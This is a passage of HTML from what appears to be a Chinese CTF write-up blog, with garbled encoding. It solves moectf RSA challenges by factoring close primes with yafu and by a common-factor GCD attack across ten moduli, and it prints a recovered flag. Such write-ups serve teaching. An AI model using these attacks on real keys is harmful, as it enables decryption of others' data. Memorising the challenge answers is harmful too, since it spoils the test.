class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure>

<h4 id="p-q-ã€å¤§æ•°åˆ†è§£ã€‘"><a href="#p-q-ã€å¤§æ•°åˆ†è§£ã€‘" class="headerlink" title="|p-q| ã€å¤§æ•°åˆ†è§£ã€‘"></a>|p-q| ã€å¤§æ•°åˆ†è§£ã€‘</h4><p>DESCRIPTION: what will next_prime cause?</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fs:</span><br><span class="line">    flag = fs.read().strip()</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">72</span></span><br><span class="line"> </span><br><span class="line">m = <span class="built_in">int</span>.from_bytes(flag,<span class="string">&quot;big&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, isPrime</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">next_prime</span>(<span class="params">p</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p += <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(p):</span><br><span class="line">            <span class="keyword">return</span> p</span><br><span class="line"> </span><br><span class="line">p = getPrime(<span class="number">2048</span>)</span><br><span class="line">q = next_prime(p)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>,c)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># n = 329960318345010350458589325571454799968957932130539403944044204698872359769449414256378111233592533561892402020955736786563103586897940757198920737583107357264433730515123570697570757034221232010688796344257587359198400915567115397034901247038275403825404094129637119512164953012131445747740645183682571690806238508035172474685818036517880994658466362305677430221344381425792427288500814551334928982040579744048907401043058567486871621293983772331951723963911377839286050368715384227640638031857101612517441295926821712605955984000617738833973829140899288164786111118033301974794123637285172303688427806450817155786233788027512244397952849209700013205803489334055814513866650854230478124920442832221946442593769555237909177172933634236392800414176981780444770542047378630756636857018730168151824307814244094763132088236333995807013617801783919113541391133267230410179444855465611792191833319172887852945902960736744468250550722314565805440432977225703650102517531531476188269635151281661081058374242768608270563131619806585194608795817118466680430500830137335634289617464844004904410907221482919453859885955054140320857757297655475489972268282336250384384926216818756762307686391740965586168590784252524275489515352125321398406426217</span></span><br><span class="line"><span class="comment"># c = 307746143297103281117512771170735061509547958991947416701685589829711285274762039205145422734327595082350457374530975854337055433998982493020603245187129916580627539476324521854057990929173492940833073106540441902619425074887573232779899379436737429823569006431370954961865581168635086246592539153824456681688944066925973182272443586463636373955966146029489121226571408532284480270826510961605206483011204059402338926815599691009406841471142048842308786000059979977645988396524814553253493672729395573658564825709547262230219183672493306100392069182994445509803952976016630731417479238769736432223194249245020320183199001774879893442186017555682902409661647546547835345461056900610391514595370600575845979413984555709077635397717741521573798309855584473259503981955303774208127361309229536010653615696850725905168242705387575720694946072789441481191449772933265705810128547553027708513478130258801233619669699177901566688737559102165508239876805822898509541232565766265491283807922473440397456701500524925191214292669986798631732639221198138026031561329502985577205314190565609214349344303324429408234237832110076900414483795318189628198913032900272406887003325858236057373096880675754802725017537119549989304878960436575670784578550</span></span><br></pre></td></tr></table></figure>

<p>å·²çŸ¥n c e , ä½†æ˜¯næ— æ³•é€šè¿‡åœ¨çº¿åˆ†è§£å‡ºæ¥ p å’Œ q ç›¸å·®è¾ƒå°</p>
<p>å¯èƒ½è€ƒå¯Ÿçš„å¤§æ•°åˆ†è§£æ³• ç”¨yafuå»åˆ†è§£ å¾—åˆ°p q</p>
<p>yafu-x64 â€œfactor(@)â€ -batchfile data.txt</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">n = <span class="number">329960318345010350458589325571454799968957932130539403944044204698872359769449414256378111233592533561892402020955736786563103586897940757198920737583107357264433730515123570697570757034221232010688796344257587359198400915567115397034901247038275403825404094129637119512164953012131445747740645183682571690806238508035172474685818036517880994658466362305677430221344381425792427288500814551334928982040579744048907401043058567486871621293983772331951723963911377839286050368715384227640638031857101612517441295926821712605955984000617738833973829140899288164786111118033301974794123637285172303688427806450817155786233788027512244397952849209700013205803489334055814513866650854230478124920442832221946442593769555237909177172933634236392800414176981780444770542047378630756636857018730168151824307814244094763132088236333995807013617801783919113541391133267230410179444855465611792191833319172887852945902960736744468250550722314565805440432977225703650102517531531476188269635151281661081058374242768608270563131619806585194608795817118466680430500830137335634289617464844004904410907221482919453859885955054140320857757297655475489972268282336250384384926216818756762307686391740965586168590784252524275489515352125321398406426217</span></span><br><span class="line">c = <span class="number">307746143297103281117512771170735061509547958991947416701685589829711285274762039205145422734327595082350457374530975854337055433998982493020603245187129916580627539476324521854057990929173492940833073106540441902619425074887573232779899379436737429823569006431370954961865581168635086246592539153824456681688944066925973182272443586463636373955966146029489121226571408532284480270826510961605206483011204059402338926815599691009406841471142048842308786000059979977645988396524814553253493672729395573658564825709547262230219183672493306100392069182994445509803952976016630731417479238769736432223194249245020320183199001774879893442186017555682902409661647546547835345461056900610391514595370600575845979413984555709077635397717741521573798309855584473259503981955303774208127361309229536010653615696850725905168242705387575720694946072789441481191449772933265705810128547553027708513478130258801233619669699177901566688737559102165508239876805822898509541232565766265491283807922473440397456701500524925191214292669986798631732639221198138026031561329502985577205314190565609214349344303324429408234237832110076900414483795318189628198913032900272406887003325858236057373096880675754802725017537119549989304878960436575670784578550</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"> </span><br><span class="line">p = <span class="number">18164809890142267890219276206773099235072154806950582020347085518282960761937147879570277730919110196557742226232054602784278585009762036923951358612733074768279344311938292845187804144458991947979616574535662033512236959010688698879953460760771547964758688700129994322153904156260452550830932232536673055480604083903327472696393017478985867846428177588049472509968031143243583420309569129756696755744088888618703553769561648077215188783123207031628505020478500655602448720006243614258852026797076054766680755124052134730998085155245587457870148748357237005392662882609410088994421984160941612734270140092780661013147</span></span><br><span class="line">q = <span class="number">18164809890142267890219276206773099235072154806950582020347085518282960761937147879570277730919110196557742226232054602784278585009762036923951358612733074768279344311938292845187804144458991947979616574535662033512236959010688698879953460760771547964758688700129994322153904156260452550830932232536673055480604083903327472696393017478985867846428177588049472509968031143243583420309569129756696755744088888618703553769561648077215188783123207031628505020478500655602448720006243614258852026797076054766680755124052134730998085155245587457870148748357237005392662882609410088994421984160941612734270140092780661012811</span></span><br><span class="line"> </span><br><span class="line">phi = (q-<span class="number">1</span>)*(p-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 249570974874683965885412406252605618726234717727556010398801764299908492512193226188087080181411750441170733603594547698398355811259760491544478706104866437273570349903637264438082036501309893201853054530797085698086038930446341917253155542909918241109987960175261486095152611819450932537581881711935930523418301766075705320203488107026433326292326129964637231122450539195821148674656840827466506395467469336596187495150898167299757789760635604231119016080856416978094961880727247145339982410533843888681043762135779060589853641865062809008652863428511798134312640617069911330859586320707783253640468229637716197145456887151857321060895164506792959237583562153616821715227622149105424842796708765315185129394537990268953771886929129434944500627323270496299902926231322790089251488584050110359247631650371779539584638092613495249267770302548319160951648265502444728433845081216709475591663328705134345555015199691574797815881902074474740834019596217789390369463038413250460469981479445571182983708770974508871216230067364084569609345681679365899779149338405373793064777911745712622109982221760064168488212106983408084522488047694941657394970605812241695735043502461108018842446035680879002550530817399147238728181034578381424909192073</span></span><br><span class="line"><span class="comment"># 105729052004695709707494302269801507248481230436271190010483646186661275972279555995233438869567815797586929422044928213974555400264124465863739443775408739791783027036876669</span></span><br><span class="line"><span class="comment"># b&#x27;moectf&#123;it_iS_vUlnErablE_iF_p_iS_aboUt_thE_SaME_SiZE_aS_Q_MVoAYArrlG3uco&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="rsa-signin-ã€å…¬å…±å› å­æ”»å‡»ã€‘"><a href="#rsa-signin-ã€å…¬å…±å› å­æ”»å‡»ã€‘" class="headerlink" title="rsa_signin ã€å…¬å…±å› å­æ”»å‡»ã€‘"></a>rsa_signin ã€å…¬å…±å› å­æ”»å‡»ã€‘</h4><p>DESCRIPTION: çœŸ signin</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read().strip()</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">int</span>.from_bytes(flag, <span class="string">&quot;big&quot;</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrimeimpo</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    p = getPrime(<span class="number">1024</span>)</span><br><span class="line">    q = getPrime(<span class="number">1024</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>, c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 17524722204224696445172535263975543817720644608816706978363749891469511686943372362091928951563219068859089058278944528021615923888948698587206920445508493551162845371086030869059282352535451058203615402089133135136481314666971507135484450966505425514285114192275051972496161810571035753943880190780759479521486741046704043699838021850105638224212696697865987677760179564370167062037563913329993433080123575434871852732981112883423565015771421868680113407260917902892944119552200927337996135278491046562185003012971570532979090484837684759828977460570826320870379601193678304983534424368152743368343335213808684523217</span></span><br><span class="line"><span class="string">c = 6870605439714128574950893771863182370595667973241984289208050776870220326525943524507319708560433091378319367164606150977103661770065561661544375425887970907060665421562712515902428061727268441585629591525591001533188276465911918724808701356962871139957343861919730086334623932624184172272488406793955068827527130338853980609365042071290967556159598511667974987218999253443575482949258292953639729393456515185185102248985930422080581185292420347510600574229080211050520146551505605537486989306457793451086767402197128573781597156939709237045132856159368959981648969874765462190363842275826077556314448408825308218451</span></span><br><span class="line"><span class="string">n = 24974121071274650888046048586598797033399902532613815354986756278905133499432183463847175542164798764762683121930786715931063152122056911933710481566265603626437742951648885379847799327315791800670175616973945640322985175516271373004547752061826574576722667907302681961850865961386200909397231865804894418194711076667760169256682834206788730947602211228930301853348503098156592000286467190760378847541148772869356389938999094673945092387627113807899212568399028514283219850734634544982646070106811651490010946670117927664594365986238107951837041859682547029079035013475238052160645871718246031144694712586073789250183</span></span><br><span class="line"><span class="string">c = 10324627733161143472233272675096997859064721978612320424254305978486200326061730105384511258706433940176741256952824288120499229240005823611541292676234913505775165761543820764046537413943393325463602612485849366939102550336256797820440347815027443410399157963547486098366749815425187247171697678576246606105486928212486117878157055321965270364583625270716186820068538749425299073309429589410882809098930213978117176627031795312102177342499674234163614021182116065492884880492891668658240362567156235958605768725892407536211503981819707919444725863397622629226309480836486427388484176463279384813974310500625102568341</span></span><br><span class="line"><span class="string">n = 14215826065753265334521416948225868542990756976323308408298887797364519400310818641526401662106853573185085731682502059761982246604277475488691297554851873224516934619888327644352138127883043558424300092247604877819821625587944308487310522092440517150600171819145803937177931473336108429889165189521078678397694303305705260759351843006130968234071638035667854938070597400634242396852782331461576526836227336952718230741560369621645218729592233657856104560425642219241082727756696967324334634822771842625681505869025740662258929200756109704988223034840699133778958569054445520305361142302393767439478256174414187983763</span></span><br><span class="line"><span class="string">c = 415916446053083522663299405080903121619846594209033663622616979372099135281363175464579440520262612010099820951944229484417996994283898028928384268216113118778734726335389504987546718739928112684600918108591759061734340607527889972020273454098314620790710425294297542021830654957828983606433731988998097351888879368160881316237557097381718444193741788664735559392675419489952796677690968481917700683813252460912749931286739585465657312416977086336732056497161860235343155953578618273940135486362350057858779130960380833359506761436212727289297656191243565734621757889931250689354508999144817518599291078968866323093</span></span><br><span class="line"><span class="string">n = 12221355905532691305226996552124162033756814028292708728711809229588190407700199452617060657420166395065565154239801465361510672853972152857415394695376825120759202857555325904640144375262531345320714166285999668052224661520834318497234299585219832943519644095197479639328120838919035625832361810964127485907587199925564724081163804724975965691571850962714258888527902920462746795712011579424322515292865504642938090200503979483095345893697972170153990274670257331483858538617460680462369680572833191232126527727222302641204529110948993583190295067970240051042000918629138767209918572311469915774910003970381965123241</span></span><br><span class="line"><span class="string">c = 2248834602646305164283014556051672824689884721514190813323189875541899566338153534858709617544459297836048770439230174669883719627734394673012731609952869246171300132019334542245094425654362711870373095782083791160029789553806741967408922001051006100049326921742208757147339981269528740944842177729701945606827918253016001436218891580980192743564642120923356793292885805519110411357830040053435569937296612987581482128241218218550319154933831743819546558930918761162723110000328532730751591375727881221199739397698390594797621758011191224528339478784930214820615602510460640307707682865125229937141010351138099874025</span></span><br><span class="line"><span class="string">n = 18152103454920389919231636321286527841833809319334215885641536161086810144890443857211776387914779781628740172079478910188540146498426564211851629962338413488555121865779016981727229209606498886170396500155102635962395243364899026418106378234307821492609778555173516000309435730752571818439328803899462791834490025768785383592935046996428331508608555503567191807692523852530836008436655164751054189301721070209363416058642811329040202582026786024825518381761299547703962502636888833428457116986351812252188468878701301184044948733274488264320930936362549028124581962244201377136969591119942276742760215403738913067567</span></span><br><span class="line"><span class="string">c = 2797812094994121597295362327809389195134238119144547570610194659000554967367804835006774413888965325870488368112707535584687083342412367127561646136089638402907513075405746055834487062923240856950047936297155455745928810738711368950139327254040579266046642851362228893522740216519732851152162928545416236075387903789535000820423985522550638100049857678600662008021574841083416323980817348573062083159710189689337626277009675683473560325178417766400002763719953723259300977655801234386662217462862844994462505601804422871991694828697337752697234180117437785537788728412520613916334045368736691714704501962513954509705</span></span><br><span class="line"><span class="string">n = 22877887459293720334652698748191453972019668578065068224653972884599636421200068659750242304040301306798039254241668648594556654589309801728248683586229288074709849246660525799452637187132633064172425677552176203292787732404537215347782229753837476655088638984496409603054524994383358547132112778403912563916886533181616856401929346567686400616307916690806467019665390260267596320840786982457521423178851498130935577260638269429250197050326097193841333205073650802709022947551398142692735680419453533128176592587955634333425401930362881423044363132586170013458300714163531162544301477356808388416864173949089028317961</span></span><br><span class="line"><span class="string">c = 12271947322974809255127222556723394446467844330408506340843897575503534175121932185624776713618037572593449207329510171212097269297133492090526270770286000839978630002819714376964416081198925899119135271459404333829811516667576167576916805217016117373027245648473458331936273975110163065432285322832123169216976420362833557809289561705091817949915218278430834098156335989014645979633658818904753942786129126233956314517292746008579152368541316795082120147520597254020266752859205131887527661767589367756335766220841483940854397440079467053684289006956034944336788288196391829411432383541473132962783883758561108297747</span></span><br><span class="line"><span class="string">n = 19844333358004073542783728196775487079202832688982038135532362073659058674903791697765527614270399097276261983744620537925712167578187109058145015032736796457938148615396547198728652435169126585595701228287449135664667959433491335769206692390262797325133960778920452511673878233190120432257482339068405290918739453464061987163074129048150451046315248186376609350095502130018696275764450248681787926130463463923862832714969425813770847493135627599129546112143050369344208092649256659330284904392961574494907186727388685504929586018639846040474616307662546605623294842316524163106100888851228858194942825157286544846177</span></span><br><span class="line"><span class="string">c = 9531264751315473345056673937611382755236533664089452852716992791452558274873158812669513178040971923528201631609089069182049526587423864397527252061341857426422965190913745048414029690931254119437249218321954899956104589066479231204536856131403590472063496956452030342299863907499976917750846369802185896519725837163530049157920978007252920334447236842959033879772444475877613295594785710745889554296655932909212643500877218304116451889820444820534937901427158918411546484157737612926382420354101675658160847653151539420222526999426483473829341628599881460824765758346670633385844187252696874025582747177333702736465</span></span><br><span class="line"><span class="string">n = 16956880944655068255446705024149899655327230949463546092744762226005904114738078692036960935391303255804754787864713189658290361949509917704853428701870609882427423574672772606814823959758208695540116440342488334213300943604780971422918744381486937517952553797134323570131582724393100092308466968491068503301604506186521656059375518680612292667310641047190088814753025794048591445267711939066523165042651430468971452726568222388482323097260496415484997546126185688914792795834046855221759289007609518312601640548469651358391745947588643697900883634533872314566389446271647587564348026861264979727062157272541149018781</span></span><br><span class="line"><span class="string">c = 16110326928338602237561005337578085623028116490564329920738844771341250444164294693848130674347672763073995755532723894042946521372321947507527854966013459795492930736187058535665041545095683801386814190612817128504426590828954205050425979880047802547011117626354405687170961272200066258220699329112978151044633994329352673342582175349200008181837211288847301836681860817044391028992501763375849046751094019224570802498414368189170656992427042010362385494565216988561215657424755648213390551881450141899860811844684546992754530755092358644968088017107313907435586729574798046187046145596726569637758312033849476689378</span></span><br><span class="line"><span class="string">n = 16472195897077185060734002588086375750797253422014472876266294484788862733424113898147596402056889527985731623940969291811284437034420929030659419753779530635563455664549165618528767491631867637613948406196511848103083967995689432928779805192695209899686072900265108597626632371718430059561807147486376536203800038054012500244392964187780217667805308512187849789773573138494622201856638931435423778275004491853486855300574479177472267767506041000072575623287557610576406578525902565241580838652860552046216587141709709405062150243990097835181557208274750462554811004137033087430556692966525170882625891516050207318491</span></span><br><span class="line"><span class="string">c = 11867731823522211833301190385669833752050387304375114576570892885641949969365352586215693183003550684262313893105989683214739695968039039944442567581277252581988489020834299896625977474857889570528169919064941042132119301236852358823696947330423679033138054012027878783478922023431469564210485180679933264749281963405243082505688901662659030897104957499953192201440290084373968716271056483463909282407034181891901928790601973222643210525000717355062752079302291729448234374709852429885984987094307177760741403086538949190424454337896501402430653783597070178968921411867485584517214777073301007918941216316241784521708</span></span><br><span class="line"><span class="string">n = 13890749889361612188368868998653029697326614782260719535555306236512452110708495623964530174188871342332417484996749651846510646453983388637377706674890018646246874688969342600780781646175634455109757266442675502522791531161284420286435654971819525519296719668701529481662071464145515727217108362496784024871976015116522898184301395037566514980846499856316532479656908169681719288258287756566886281183699239684997698487409138330229321935477734921670373632304542254938831218652340699024011371979519574576890581492623709896310465567043899767342676912434857372520308852745792360420376574037705943820090308501053778144141</span></span><br><span class="line"><span class="string">c = 6250115196713939477947942995075509357173312813431601073354390451609559579925704891503987992181988654989477525811826607070378476102616752398280691012244301950194800995432882828020405062344160270290542566163969692748126314259624623341922057435728127596172871894887055305291345372720594481096374310285437492746765510292863238933163142677773310305789984897974266961231555124787205980411992251387207335655129551950825339766848166539671565212408741432649813058363660321480995187545006718837863674527475323414266732366507905974800565463011676462244368010182725161416783875646259625352308599198614681446394427674340328493047</span></span><br><span class="line"><span class="string">n = 21457499145521259498911107987303777576783467581104197687610588208126845121702391694574491025398113729462454256070437978257494064504146718372095872819969887408622112906108590961892923178192792218161103488204912792358327748493857104191029765218471874759376809136402361582721860433355338373725980783308091544879562698835405262108188595630215081260699112737457564998798692048522706388318528370551365364702529068656665853097899157141017378975007689790000067275142731212069030175682911154288533716549782283859340452266837760560153014200605378914071410125895494331253564598702942990036163269043699029806343766286247742865671</span></span><br><span class="line"><span class="string">c = 6269656777204332618433779865483197625538144405832409880710764183039800286008967127279281167109250083159801218370191973055663058165456565194979210256278526713608759141588082614531352489547674696723140599892318118960648862531538435596775798128845789504910467783731144808685373807716609662688064728614003904579841055786083326311313295311152563668422289435606771091246147867715987583149743032723028324394173498623642539175178996531881058274717907066845565199058931743481410454382746158558886667761300257488769795092777021292335562818583719708133179974425584610403335487082478848975656282384575767178925517257692365828720</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>å·²çŸ¥å¤šç»„ n c å’Œ e=65537 eè¾ƒå¤§</p>
<p>å…¬å…±å› å­æ”»å‡» </p>
<p>ä½¿ç”¨åŒä¸€ä¸ª(m,e) ä½¿ç”¨è¾ƒå¤šç»„NåŠ å¯†åçš„å¤šç»„(n,c) å¯ä»¥å¾ªç¯æ±‚è§£è¿™äº›nçš„æœ€å¤§å…¬çº¦æ•°ï¼Œå¦‚æœå­˜åœ¨ </p>
<p>gcd(Ni,Nj)!=1 åˆ™å¯é¡ºåˆ©åˆ†è§£Niå’ŒNj ä»è€Œè¿˜åŸæ˜æ–‡</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n1 = <span class="number">17524722204224696445172535263975543817720644608816706978363749891469511686943372362091928951563219068859089058278944528021615923888948698587206920445508493551162845371086030869059282352535451058203615402089133135136481314666971507135484450966505425514285114192275051972496161810571035753943880190780759479521486741046704043699838021850105638224212696697865987677760179564370167062037563913329993433080123575434871852732981112883423565015771421868680113407260917902892944119552200927337996135278491046562185003012971570532979090484837684759828977460570826320870379601193678304983534424368152743368343335213808684523217</span></span><br><span class="line">c1 = <span class="number">6870605439714128574950893771863182370595667973241984289208050776870220326525943524507319708560433091378319367164606150977103661770065561661544375425887970907060665421562712515902428061727268441585629591525591001533188276465911918724808701356962871139957343861919730086334623932624184172272488406793955068827527130338853980609365042071290967556159598511667974987218999253443575482949258292953639729393456515185185102248985930422080581185292420347510600574229080211050520146551505605537486989306457793451086767402197128573781597156939709237045132856159368959981648969874765462190363842275826077556314448408825308218451</span></span><br><span class="line">n2 = <span class="number">24974121071274650888046048586598797033399902532613815354986756278905133499432183463847175542164798764762683121930786715931063152122056911933710481566265603626437742951648885379847799327315791800670175616973945640322985175516271373004547752061826574576722667907302681961850865961386200909397231865804894418194711076667760169256682834206788730947602211228930301853348503098156592000286467190760378847541148772869356389938999094673945092387627113807899212568399028514283219850734634544982646070106811651490010946670117927664594365986238107951837041859682547029079035013475238052160645871718246031144694712586073789250183</span></span><br><span class="line">c2 = <span class="number">10324627733161143472233272675096997859064721978612320424254305978486200326061730105384511258706433940176741256952824288120499229240005823611541292676234913505775165761543820764046537413943393325463602612485849366939102550336256797820440347815027443410399157963547486098366749815425187247171697678576246606105486928212486117878157055321965270364583625270716186820068538749425299073309429589410882809098930213978117176627031795312102177342499674234163614021182116065492884880492891668658240362567156235958605768725892407536211503981819707919444725863397622629226309480836486427388484176463279384813974310500625102568341</span></span><br><span class="line">n3 = <span class="number">14215826065753265334521416948225868542990756976323308408298887797364519400310818641526401662106853573185085731682502059761982246604277475488691297554851873224516934619888327644352138127883043558424300092247604877819821625587944308487310522092440517150600171819145803937177931473336108429889165189521078678397694303305705260759351843006130968234071638035667854938070597400634242396852782331461576526836227336952718230741560369621645218729592233657856104560425642219241082727756696967324334634822771842625681505869025740662258929200756109704988223034840699133778958569054445520305361142302393767439478256174414187983763</span></span><br><span class="line">c3 = <span class="number">415916446053083522663299405080903121619846594209033663622616979372099135281363175464579440520262612010099820951944229484417996994283898028928384268216113118778734726335389504987546718739928112684600918108591759061734340607527889972020273454098314620790710425294297542021830654957828983606433731988998097351888879368160881316237557097381718444193741788664735559392675419489952796677690968481917700683813252460912749931286739585465657312416977086336732056497161860235343155953578618273940135486362350057858779130960380833359506761436212727289297656191243565734621757889931250689354508999144817518599291078968866323093</span></span><br><span class="line">n4 = <span class="number">12221355905532691305226996552124162033756814028292708728711809229588190407700199452617060657420166395065565154239801465361510672853972152857415394695376825120759202857555325904640144375262531345320714166285999668052224661520834318497234299585219832943519644095197479639328120838919035625832361810964127485907587199925564724081163804724975965691571850962714258888527902920462746795712011579424322515292865504642938090200503979483095345893697972170153990274670257331483858538617460680462369680572833191232126527727222302641204529110948993583190295067970240051042000918629138767209918572311469915774910003970381965123241</span></span><br><span class="line">c4 = <span class="number">2248834602646305164283014556051672824689884721514190813323189875541899566338153534858709617544459297836048770439230174669883719627734394673012731609952869246171300132019334542245094425654362711870373095782083791160029789553806741967408922001051006100049326921742208757147339981269528740944842177729701945606827918253016001436218891580980192743564642120923356793292885805519110411357830040053435569937296612987581482128241218218550319154933831743819546558930918761162723110000328532730751591375727881221199739397698390594797621758011191224528339478784930214820615602510460640307707682865125229937141010351138099874025</span></span><br><span class="line">n5 = <span class="number">18152103454920389919231636321286527841833809319334215885641536161086810144890443857211776387914779781628740172079478910188540146498426564211851629962338413488555121865779016981727229209606498886170396500155102635962395243364899026418106378234307821492609778555173516000309435730752571818439328803899462791834490025768785383592935046996428331508608555503567191807692523852530836008436655164751054189301721070209363416058642811329040202582026786024825518381761299547703962502636888833428457116986351812252188468878701301184044948733274488264320930936362549028124581962244201377136969591119942276742760215403738913067567</span></span><br><span class="line">c5 = <span class="number">2797812094994121597295362327809389195134238119144547570610194659000554967367804835006774413888965325870488368112707535584687083342412367127561646136089638402907513075405746055834487062923240856950047936297155455745928810738711368950139327254040579266046642851362228893522740216519732851152162928545416236075387903789535000820423985522550638100049857678600662008021574841083416323980817348573062083159710189689337626277009675683473560325178417766400002763719953723259300977655801234386662217462862844994462505601804422871991694828697337752697234180117437785537788728412520613916334045368736691714704501962513954509705</span></span><br><span class="line">n6 = <span class="number">22877887459293720334652698748191453972019668578065068224653972884599636421200068659750242304040301306798039254241668648594556654589309801728248683586229288074709849246660525799452637187132633064172425677552176203292787732404537215347782229753837476655088638984496409603054524994383358547132112778403912563916886533181616856401929346567686400616307916690806467019665390260267596320840786982457521423178851498130935577260638269429250197050326097193841333205073650802709022947551398142692735680419453533128176592587955634333425401930362881423044363132586170013458300714163531162544301477356808388416864173949089028317961</span></span><br><span class="line">c6 = <span class="number">12271947322974809255127222556723394446467844330408506340843897575503534175121932185624776713618037572593449207329510171212097269297133492090526270770286000839978630002819714376964416081198925899119135271459404333829811516667576167576916805217016117373027245648473458331936273975110163065432285322832123169216976420362833557809289561705091817949915218278430834098156335989014645979633658818904753942786129126233956314517292746008579152368541316795082120147520597254020266752859205131887527661767589367756335766220841483940854397440079467053684289006956034944336788288196391829411432383541473132962783883758561108297747</span></span><br><span class="line">n7 = <span class="number">19844333358004073542783728196775487079202832688982038135532362073659058674903791697765527614270399097276261983744620537925712167578187109058145015032736796457938148615396547198728652435169126585595701228287449135664667959433491335769206692390262797325133960778920452511673878233190120432257482339068405290918739453464061987163074129048150451046315248186376609350095502130018696275764450248681787926130463463923862832714969425813770847493135627599129546112143050369344208092649256659330284904392961574494907186727388685504929586018639846040474616307662546605623294842316524163106100888851228858194942825157286544846177</span></span><br><span class="line">c7 = <span class="number">9531264751315473345056673937611382755236533664089452852716992791452558274873158812669513178040971923528201631609089069182049526587423864397527252061341857426422965190913745048414029690931254119437249218321954899956104589066479231204536856131403590472063496956452030342299863907499976917750846369802185896519725837163530049157920978007252920334447236842959033879772444475877613295594785710745889554296655932909212643500877218304116451889820444820534937901427158918411546484157737612926382420354101675658160847653151539420222526999426483473829341628599881460824765758346670633385844187252696874025582747177333702736465</span></span><br><span class="line">n8 = <span class="number">16956880944655068255446705024149899655327230949463546092744762226005904114738078692036960935391303255804754787864713189658290361949509917704853428701870609882427423574672772606814823959758208695540116440342488334213300943604780971422918744381486937517952553797134323570131582724393100092308466968491068503301604506186521656059375518680612292667310641047190088814753025794048591445267711939066523165042651430468971452726568222388482323097260496415484997546126185688914792795834046855221759289007609518312601640548469651358391745947588643697900883634533872314566389446271647587564348026861264979727062157272541149018781</span></span><br><span class="line">c8 = <span class="number">16110326928338602237561005337578085623028116490564329920738844771341250444164294693848130674347672763073995755532723894042946521372321947507527854966013459795492930736187058535665041545095683801386814190612817128504426590828954205050425979880047802547011117626354405687170961272200066258220699329112978151044633994329352673342582175349200008181837211288847301836681860817044391028992501763375849046751094019224570802498414368189170656992427042010362385494565216988561215657424755648213390551881450141899860811844684546992754530755092358644968088017107313907435586729574798046187046145596726569637758312033849476689378</span></span><br><span class="line">n9 = <span class="number">16472195897077185060734002588086375750797253422014472876266294484788862733424113898147596402056889527985731623940969291811284437034420929030659419753779530635563455664549165618528767491631867637613948406196511848103083967995689432928779805192695209899686072900265108597626632371718430059561807147486376536203800038054012500244392964187780217667805308512187849789773573138494622201856638931435423778275004491853486855300574479177472267767506041000072575623287557610576406578525902565241580838652860552046216587141709709405062150243990097835181557208274750462554811004137033087430556692966525170882625891516050207318491</span></span><br><span class="line">c9 = <span class="number">11867731823522211833301190385669833752050387304375114576570892885641949969365352586215693183003550684262313893105989683214739695968039039944442567581277252581988489020834299896625977474857889570528169919064941042132119301236852358823696947330423679033138054012027878783478922023431469564210485180679933264749281963405243082505688901662659030897104957499953192201440290084373968716271056483463909282407034181891901928790601973222643210525000717355062752079302291729448234374709852429885984987094307177760741403086538949190424454337896501402430653783597070178968921411867485584517214777073301007918941216316241784521708</span></span><br><span class="line">n10 = <span class="number">13890749889361612188368868998653029697326614782260719535555306236512452110708495623964530174188871342332417484996749651846510646453983388637377706674890018646246874688969342600780781646175634455109757266442675502522791531161284420286435654971819525519296719668701529481662071464145515727217108362496784024871976015116522898184301395037566514980846499856316532479656908169681719288258287756566886281183699239684997698487409138330229321935477734921670373632304542254938831218652340699024011371979519574576890581492623709896310465567043899767342676912434857372520308852745792360420376574037705943820090308501053778144141</span></span><br><span class="line">c10 = <span 